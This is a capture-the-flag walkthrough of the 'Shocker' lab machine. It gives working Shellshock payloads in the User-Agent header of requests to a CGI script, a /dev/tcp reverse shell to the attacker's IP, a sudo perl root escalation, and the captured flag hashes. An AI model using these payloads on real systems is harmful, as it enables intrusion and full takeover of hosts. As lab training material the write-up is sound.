### Summary
We start this box with only 2 ports, `SSH` and `HTTP`. We perform directory brute-forcing on the web server with `feroxbuster`, modified so that we can see all the output it thinks is uninteresting. We further brute-force the `/cgi-bin` directory to find a `user.sh` script and, given the machine name, we attempt to exploit Shellshock (CVE-2014-6271) and succeed in RCE. From there we utilize a bash reverse shell and quickly perform nopasswd (`sudo -l`) to see we can run `perl` as sudo which quickly gives us a root shell

### Tools
- `feroxbuster` - web application directory brute-force
- [[Burp Suite]]
- `perl` - sudo privilege escalation

###### [[#Recon]]
- [[#Nmap Scan]]
- [[#SSH - TCP 2222]]
- [[#HTTP - TCP 80]]
- [[#Shellshock (CVE-2014-6271)]]
	- [[#Manual Discovery]]
###### [[#User Shell - shelly]]
- [[#Reverse Bash Shell]]
	- [[#Shell Upgrade]]
###### [[#Root Shell]]
- [[#GTFObins]]

---
# Recon
## Nmap Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.43.139 -oN nmap/tcp            
Completed SYN Stealth Scan at 12:40, 12.11s elapsed (65535 total ports)
Nmap scan report for 10.129.43.139
Host is up, received echo-reply ttl 63 (0.031s latency).
Scanned at 2025-12-22 12:39:57 EST for 12s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE    SERVICE      REASON
80/tcp    open     http         syn-ack ttl 63
2222/tcp  open     EtherNetIP-1 syn-ack ttl 63
25721/tcp filtered unknown      no-response
29170/tcp filtered unknown      no-response
33157/tcp filtered unknown      no-response
35871/tcp filtered unknown      no-response
52104/tcp filtered unknown      no-response
58338/tcp filtered unknown      no-response
61664/tcp filtered unknown      no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
           Raw packets sent: 120829 (5.316MB) | Rcvd: 76742 (3.070MB)
```
```sh
❯ sudo nmap -p 80,2222,25721,29170,33157,35871,52104,58338,61664 -sCV -vv 10.129.43.139 -oN nmap/scripts                   
Completed NSE at 12:41, 0.00s elapsed
Nmap scan report for 10.129.43.139
Host is up, received reset ttl 63 (0.029s latency).
Scanned at 2025-12-22 12:41:15 EST for 7s

PORT      STATE  SERVICE REASON         VERSION
80/tcp    open   http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Site doesn\'t have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp  open   ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
25721/tcp closed unknown reset ttl 63
29170/tcp closed unknown reset ttl 63
33157/tcp closed unknown reset ttl 63
35871/tcp closed unknown reset ttl 63
52104/tcp closed unknown reset ttl 63
58338/tcp closed unknown reset ttl 63
61664/tcp closed unknown reset ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Looks like there are only 2 ports open, `HTTP` on 80 and `SSH` on 222
- Based on the `OpenSSH` and `Apache` versions, we can check the [OS Enumeration cheatsheet](https://0xdf.gitlab.io/cheatsheets/os) to determine we're likely running Ubuntu version `16.04` or `16.10`
- The TTLs are `63` which is typical for one hop away on a posix system

## SSH - TCP 2222
---
- We can probe the ssh server to see if we can get a password-less login:
```sh
❯ nxc ssh shocker --port 2222 -u root -p ''
SSH         10.129.43.139   2222   shocker          [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
SSH         10.129.43.139   2222   shocker          [-] root:

❯ nxc ssh shocker --port 2222 -u shocker -p ''
SSH         10.129.43.139   2222   shocker          [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
SSH         10.129.43.139   2222   shocker          [-] shocker:

❯ nxc ssh shocker --port 2222 -u '' -p ''     
SSH         10.129.43.139   2222   shocker          [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
SSH         10.129.43.139   2222   shocker          [-] :
```
- No luck

## HTTP - TCP 80
---
- A quick search on `searchsploit` shows us a RCE vulnerability for `Apache HTTP Server 2.4.49` but only for `2.4.49` so dead-end there
- Inspecting the actual site shows us an extremely bare-minimum site:
```http
 <!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html> 
```

- We can perform directory brute-forcing with `feroxbuster`, but we see pretty quickly though that the web application doesn't automatically append `/`'s to our queries.
- We can manually add them to the `feroxbuster` request with the `-f` flag. When we do this, the recursion explodes so we'll also add the `-n` flag for no recursion
- The newer versions of `feroxbuster` also hide `403` responses, which we want to see since this is an old version of apache and an old version of ubuntu, so we pass the `--dont-filter` option
```sh
❯ feroxbuster -u "http://shocker" -f -n -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories.txt -x html,php  --dont-filter | tee feroxOut
```
- random guessing with `-x html,php`
```sh
❯ cat feroxOut | grep . | grep -v 404
403      GET       11l       32w      290c http://shocker/cgi-bin/
200      GET      234l      773w    66161c http://shocker/bug.jpg
200      GET        9l       13w      137c http://shocker/
403      GET       11l       32w      287c http://shocker/.html
200      GET        9l       13w      137c http://shocker/index.html
403      GET       11l       32w      288c http://shocker/icons/
403      GET       11l       32w      296c http://shocker/server-status/
```
- From here, we can try to  brute-force `cgi-bin` and some of the other `403` directories
```sh
❯ feroxbuster -u "http://shocker/cgi-bin" -f -n -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories.txt -x sh,cgi,pl,py,php,rb

200      GET        7l       18w      119c http://shocker/cgi-bin/user.sh
```
- Most of the time, `.sh` is the winner for [cgi](https://en.wikipedia.org/wiki/Common_Gateway_Interface) scripts

- The `user.sh` page shows what looks like the result of the `uptime` bash command:
```text
Content-Type: text/plain

Just an uptime test script

 13:23:17 up 45 min,  0 users,  load average: 0.10, 0.09, 0.09
```

## Shellshock (CVE-2014-6271)
---
- Given the name of the box is `shocker`, we can assume that the [shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) vulnerability is gonna be our foothold on this box
- The shellshock bug is in bash which causes unintentional execution of commands appended to function declarations. The common shellschock payload for testing is:
```sh
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```
- This can be used in combination with `cgi` scripts because they often take user-controlled `HTTP` headers as input, like `Cookie`, `User-Agent`, `Referer`, etc. and pass them to a bash script (if the cgi script is in fact bash) 

### Manual Discovery
- We can use `burp` to intercept a request to `http://shocker/cgi-bin/user.sh` and modify the `User-Agent` to include a shellshock payload:
```http
GET /cgi-bin/user.sh HTTP/1.1
Host: shocker
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; echo youresofucked
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
- We immediately get a `500` error which is proof that we somehow bungled the response but why didn't we get the echo back? This is because it likely placed `youresofucked` in one of the `HTTP` reponse headers
- This can be rectified by providing another `echo;` before our desired output
- `echo` only works to provide a newline in shellshock because it's a bash builtin, if we tried something like `python3 -c print()` then it won't execute beyond that for bash vulnerability reasons

```http
GET /cgi-bin/user.sh HTTP/1.1
Host: shocker
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; echo; echo youresofucked
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

HTTP/1.1 200 OK
Date: Mon, 22 Dec 2025 18:39:43 GMT
Server: Apache/2.4.18 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/x-sh
Content-Length: 133

youresofucked

Content-Type: text/plain

Just an uptime test script

 13:39:43 up  1:01,  0 users,  load average: 0.00, 0.00, 0.00
```
- Hell yeah! we've got RCE
- We can test that the machine can connect to us via `ping`:
```http
GET /cgi-bin/user.sh HTTP/1.1
Host: shocker
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; echo; /bin/ping -c 3 10.10.14.50
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

HTTP/1.1 200 OK
Date: Mon, 22 Dec 2025 18:45:44 GMT
Server: Apache/2.4.18 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/x-sh
Content-Length: 381

PING 10.10.14.50 (10.10.14.50) 56(84) bytes of data.
64 bytes from 10.10.14.50: icmp_seq=1 ttl=63 time=23.5 ms
64 bytes from 10.10.14.50: icmp_seq=2 ttl=63 time=125 ms
64 bytes from 10.10.14.50: icmp_seq=3 ttl=63 time=22.5 ms

--- 10.10.14.50 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 22.516/57.036/125.087/48.121 ms
```
```sh
❯ sudo tcpdump -i tun0 icmp
dropped privs to tcpdump
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:45:49.821395 IP SHOCKER > fedora-laptop: ICMP echo request, id 1998, seq 1, length 64
13:45:49.821560 IP fedora-laptop > SHOCKER: ICMP echo reply, id 1998, seq 1, length 64
13:45:50.925859 IP SHOCKER > fedora-laptop: ICMP echo request, id 1998, seq 2, length 64
13:45:50.926011 IP fedora-laptop > SHOCKER: ICMP echo reply, id 1998, seq 2, length 64
13:45:51.824751 IP SHOCKER > fedora-laptop: ICMP echo request, id 1998, seq 3, length 64
13:45:51.824857 IP fedora-laptop > SHOCKER: ICMP echo reply, id 1998, seq 3, length 64
```

# User Shell - shelly
## Reverse Bash Shell
---
- We can utilize our shocker RCE to give us a reverse bash shell to the web server:
```http
GET /cgi-bin/user.sh HTTP/1.1
Host: shocker
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: () { :;}; echo; /bin/sh -i >& /dev/tcp/10.10.14.50/12345 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.43.139.
Ncat: Connection from 10.129.43.139:52598.
/bin/sh: 0: can\'t access tty; job control turned off
$ whoami
shelly
```

### Shell Upgrade
- Now we can perform a shell upgrade with `python3`:
```sh
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
shelly@Shocker:/usr/lib/cgi-bin$ ^Z
❯ stty raw -echo; fg
[1]  + 197937 continued  nc -lvnp 12345
                                       reset
reset: unknown terminal type unknown
Terminal type? screen
shelly@Shocker:/usr/lib/cgi-bin$ 
```

- We can grab `user.txt` now:
```sh
shelly@Shocker:/home/shelly$ cat user.txt 
1e82d41d066acfbce73bf146798a24e7
```

- Before checking privilege escalation scripts, it's always handy to run `sudo -l`:
```sh
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
- Looks like we can run `perl` as sudo lol

# Root Shell
## GTFObins
---
- A quick look at [perl's GTFObins entry](https://gtfobins.github.io/gtfobins/perl/):
- If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
	- `sudo perl -e 'exec "/bin/sh";'`

```sh
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
# whoami
root
# cd ~ && cat root.txt
84ba31a353c7b3cfec63a40c6adbb0e9
```
- chicken dinner


